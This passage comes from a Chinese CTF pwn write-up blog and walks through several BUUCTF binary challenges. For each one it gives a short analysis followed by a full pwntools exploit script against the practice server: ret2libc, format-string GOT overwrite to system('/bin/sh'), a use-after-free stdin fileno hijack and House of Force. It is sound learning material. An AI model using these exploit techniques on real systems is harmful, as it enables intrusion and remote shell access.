<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26788</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">256</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">passwd = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.close()</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26788</span>)</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p><img src="https://i.loli.net/2021/05/02/H1nfb78XC4ka5pg.png" alt="image.png"></p>
<h2 id="0x059-oneshot-tjctf-2016-one-gadget"><a href="#0x059-oneshot-tjctf-2016-one-gadget" class="headerlink" title="0x059.oneshot_tjctf_2016 - one_gadget"></a>0x059.oneshot_tjctf_2016 - one_gadget</h2><p>惯例的 <code>checksec</code> ，只开了 NX</p>
<p><img src="https://i.loli.net/2021/05/03/Jc8amUqOyIjMTr4.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>给一个任意读和跳转，那就读 got 表跳 one_gadget 即可</p>
<p><img src="https://i.loli.net/2021/05/03/1LdXls2cHeFiVaO.png" alt="image.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26263</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./oneshot_tjctf_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Value: &quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc_base + <span class="number">0x45216</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/03/9sbkfI16jzON7o3.png" alt="image.png"></p>
<h2 id="0x05A-ciscn-2019-final-2-Use-After-Free-file-no-hijack"><a href="#0x05A-ciscn-2019-final-2-Use-After-Free-file-no-hijack" class="headerlink" title="0x05A.ciscn_2019_final_2 - Use After Free + file_no hijack"></a>0x05A.ciscn_2019_final_2 - Use After Free + file_no hijack</h2><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/04/16/uvqV1ohgMNtDwJU.png" alt="image.png"></p>
<p>开了sandbox，没法拿 shell</p>
<p><img src="https://i.loli.net/2021/04/16/TymlVnQUjzaWAPd.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>在一开始时打开了flag文件，其文件描述符的标号是666</p>
<p><img src="https://i.loli.net/2021/04/16/mDfcZyVlBIYJtWa.png" alt="image.png"></p>
<p>整个程序大概是有分配、释放、打印堆块的功能</p>
<p><img src="https://i.loli.net/2021/04/08/uYBepCstIJyR2Pq.png" alt="image.png"></p>
<p>大概是能够分配两种大小的 chunk</p>
<p><img src="https://i.loli.net/2021/04/16/LS92KCXAhH1T643.png" alt="image.png"></p>
<p>以及一个裸的UAF</p>
<p><img src="https://i.loli.net/2021/04/16/HQ2RAbDe7xwrqap.png" alt="image.png"></p>
<p>限制了只能打印三次</p>
<p><img src="https://i.loli.net/2021/04/16/yW3FPNKwVzERGvD.png" alt="image.png"></p>
<p>在byebye函数中我们可以进行输入，随后程序会将我们输入的内容给输出出来</p>
<p><img src="https://i.loli.net/2021/04/16/lRJzUDxgPEdmAw5.png" alt="image.png"></p>
<p>我们不难想到，若是将 <code>stdin</code> 的 <code>_fileno</code> 域改为 <code>666</code>，那么在调用该函数时便会从flag文件中读取，由此我们便能得到flag</p>
<p>笔者这里的做法大概是先用 double free 泄漏出堆上地址低 2 字节，随后 double free 改一个 chunk 的 size 为 0x91，多次 alloc 另一种 chunk 后 free 该 chunk 送入 unsorted bin 泄露 libc 低 4 字节，随后再 double free 泄漏出堆上地址低 4 字节后 double free 改其指向堆上特定 chunk ，最后通过堆上残留指针写到 stdin 的 fileno 域</p>
<p>以及有符号无符号什么的笔者实在是不想转换了（笑），直接多次尝试获取都是正数的值再行下一步</p>
<p>故exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)#</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;which command?\n&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params"><span class="built_in">type</span>:<span class="built_in">int</span>, content:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;TYPE:\n1: int\n2: short int\n&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your inode number:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(content).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">type</span>:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;TYPE:\n1: int\n2: short int\n&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">type</span>:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;TYPE:\n1: int\n2: short int\n&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;inode number :&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x100</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        new(<span class="number">2</span>, <span class="number">0x100</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x100</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    heap_low_2_bytes = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> heap_low_2_bytes &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception()</span><br><span class="line">    log.info(<span class="built_in">hex</span>(heap_low_2_bytes))</span><br><span class="line">    new(<span class="number">2</span>, heap_low_2_bytes - <span class="number">0xa0</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x100</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        new(<span class="number">2</span>, <span class="number">0x100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">2</span>, <span class="number">0x88</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    main_arena_low_4_bytes = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">10</span>) - <span class="number">96</span></span><br><span class="line">    <span class="keyword">if</span> main_arena_low_4_bytes &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception()</span><br><span class="line">    log.info(<span class="built_in">hex</span>(main_arena_low_4_bytes - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">    main_arena_low_2_bytes = main_arena_low_4_bytes &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">if</span> (main_arena_low_2_bytes - <span class="number">0x10</span> + <span class="number">14</span> * <span class="number">0x8</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]) &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception()</span><br><span class="line">    </span><br><span class="line">    new(<span class="number">1</span>, main_arena_low_4_bytes - <span class="number">0x10</span> + <span class="number">14</span> * <span class="number">0x8</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">2</span>, main_arena_low_2_bytes - <span class="number">0x10</span> + <span class="number">14</span> * <span class="number">0x8</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    heap_low_4_bytes = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> heap_low_4_bytes &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception()</span><br><span class="line">    log.info(<span class="built_in">hex</span>(heap_low_4_bytes))</span><br><span class="line">    new(<span class="number">1</span>, heap_low_4_bytes + <span class="number">0x30</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;time no.&#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">            <span class="comment">#p = process(&#x27;./ciscn_final_2&#x27;, env =&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">            p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28664</span>)</span><br><span class="line">            exp()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可获得 flag</p>
<p><img src="https://i.loli.net/2021/05/03/ylEfUKbe9jJHC2k.png" alt="image.png"></p>
<h2 id="0x05B-x-ctf-b0verfl0w-ret2libc"><a href="#0x05B-x-ctf-b0verfl0w-ret2libc" class="headerlink" title="0x05B.x_ctf_b0verfl0w - ret2libc"></a>0x05B.x_ctf_b0verfl0w - ret2libc</h2><p>惯例的 <code>checksec</code>， 保护全关</p>
<p><img src="https://i.loli.net/2021/05/03/S6TUau94K2shjEX.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接就有一个很大的溢出</p>
<p><img src="https://i.loli.net/2021/05/03/HBnPAjhUlRJOsSW.png" alt="image.png"></p>
<p>套模板 ret2libc</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29339</span>)<span class="comment">#process(&#x27;./b0verfl0w&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/03/Xf9HZkepCuSdxJY.png" alt="image.png"></p>
<h2 id="0x05C-cmcc-pwnme1-ret2libc"><a href="#0x05C-cmcc-pwnme1-ret2libc" class="headerlink" title="0x05C.cmcc_pwnme1 - ret2libc"></a>0x05C.cmcc_pwnme1 - ret2libc</h2><p>惯例的 <code>checksec</code>， 保护全关</p>
<p><img src="https://i.loli.net/2021/05/03/c1UHpa5tNi2qkZr.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接就有一个很大的溢出</p>
<p><img src="https://i.loli.net/2021/05/03/Ny92U1QTZ8CfJhE.png" alt="image.png"></p>
<p>套模板 ret2libc</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26176</span>)<span class="comment">#process(&#x27;./pwnme1&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwnme1&#x27;</span>)</span><br><span class="line">offset = <span class="number">0xA4</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;...\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/03/YQxpwzavBcD6TMi.png" alt="image.png"></p>
<h2 id="0x05D-wdb-2018-2nd-easyfmt-fmtstr-got-hijack"><a href="#0x05D-wdb-2018-2nd-easyfmt-fmtstr-got-hijack" class="headerlink" title="0x05D.wdb_2018_2nd_easyfmt - fmtstr + got hijack"></a>0x05D.wdb_2018_2nd_easyfmt - fmtstr + got hijack</h2><p>惯例的 <code>checksec</code> ，开了NX</p>
<p><img src="https://i.loli.net/2021/05/03/nlzWTmO3Au67cS8.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>不限次数的格式化字符串漏洞利用</p>
<p><img src="https://i.loli.net/2021/05/03/kmKzTDrQPxoIR6N.png" alt="image.png"></p>
<p>格式字符串是栈上第 6 个参数</p>
<p><img src="https://i.loli.net/2021/05/03/2ahxgk5POfdzQNB.png" alt="image.png"></p>
<p>got表泄露 libc 基址 改 got 表一套带走</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p_name = <span class="string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29449</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/32bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;%7$s&#x27;</span> + p32(e.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendline(fmtstr_payload(<span class="number">6</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>]:sys_addr&#125;))</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/03/NXiHAMaTu7YbF62.png" alt="image.png"></p>
<h2 id="0x05E-inndy-echo-fmtstr-got-hijack"><a href="#0x05E-inndy-echo-fmtstr-got-hijack" class="headerlink" title="0x05E.inndy_echo - fmtstr + got hijack"></a>0x05E.inndy_echo - fmtstr + got hijack</h2><p>惯例的 <code>checksec</code> ，开了NX</p>
<p><img src="https://i.loli.net/2021/05/03/kLsH2aCt8pEXDve.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>不限次数的格式化字符串漏洞利用</p>
<p><img src="https://i.loli.net/2021/05/03/5US6TDnZHWAxG9i.png" alt="image.png"></p>
<p>格式字符串是栈上第 7 个参数</p>
<p><img src="https://i.loli.net/2021/05/03/rCBf1ybjzM2h5xW.png" alt="image.png"></p>
<p>got表泄露 libc 基址 改 got 表一套带走</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p_name = <span class="string">&#x27;./echo&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29718</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/32bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;%8$s&#x27;</span> + p32(e.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendline(fmtstr_payload(<span class="number">7</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>]:sys_addr&#125;))</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/03/4QcMXLA2zTpGxqe.png" alt="image.png"></p>
<blockquote>
<p>这和上一题不是一模一样🦄（恼</p>
</blockquote>
<h2 id="0x05F-gyctf-2020-force-House-of-Force"><a href="#0x05F-gyctf-2020-force-House-of-Force" class="headerlink" title="0x05F.gyctf_2020_force - House of Force"></a>0x05F.gyctf_2020_force - House of Force</h2><p>惯例的 <code>checksc</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/05/03/T4nS6jVxFpBUI3J.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>只有一个分配堆块的功能，不限制大小，会给出堆块地址，最多写入 <code>0x50</code> 字节，若是分配小堆块则毫无疑问可以溢出</p>
<p><img src="https://i.loli.net/2021/05/03/ND1y5ezRKtEP6X8.png" alt="image.png"></p>
<p>没有 free 功能，也没法打印，唯一的输出点是输出堆块的地址，由于其不限制 size 的大小，不难想到若是我们分配一个特别大的 chunk ，sys_malloc 便会通过 MMAP 系统调用分配一块空间，<strong>刚好挨着 libc 映射的空间</strong>，由此我们便可以获得 libc 的地址</p>
<p>有溢出，libc 2.23 ，可以考虑通过 House of Force 劫持 top chunk 进行任意地址写改 __malloc_hook 为 one_gadget，以及别忘了 realloc 调栈</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> 